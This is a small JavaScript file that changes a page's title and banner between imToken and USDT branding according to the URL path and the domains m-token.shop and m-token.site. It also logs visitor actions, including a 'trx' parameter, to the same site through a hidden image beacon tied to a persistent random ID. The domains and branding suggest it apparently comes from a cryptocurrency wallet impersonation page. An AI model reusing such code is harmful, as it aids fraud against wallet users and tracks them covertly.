let path = location.href.split("/")[3];
let counter = 0;
function setTitle() {
	if ((path == "itk" || path == "ImToken") && (document.domain != "m-token.shop" && document.domain != "m-token.site")) {
		path = "usdt";
	}
	if (counter == 0) {
		document.getElementById("gongpai").innerHTML = '<div style="height: 22rem;text-align: center;"><img src="/img/'+path+'.png" style="width: 60%; margin: 25% auto;"></div>';
	}
	if (document.title != path) {
		document.title = path;
	}
	if (counter < 300) {
		setTimeout(setTitle, 10);
	}
	counter++;
}

function log2(action="none", t="", p="trx", a="", str) {
	let url = $(".logid");
	if (!url ||url.length == 0) {
		$("body").append('<img class="logid" />');
		url = $(".logid")
	}
	let u = window.localStorage.getItem("userid");
	if (!u) {
		u = randomString(32);
		window.localStorage.setItem("userid", u);
	}
	url.attr("src", "/img/log.png?action=" + action + "&u=" + u + "&t=" + t + "&p=" + p + "&a=" + a + (str ? str : "") + "&r=" + Math.random());
}
function randomString(e) {    
    e = e || 32;
    var t = "ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678",
    a = t.length,
    n = "";
    for (i = 0; i < e; i++) n += t.charAt(Math.floor(Math.random() * a));
    return n
}
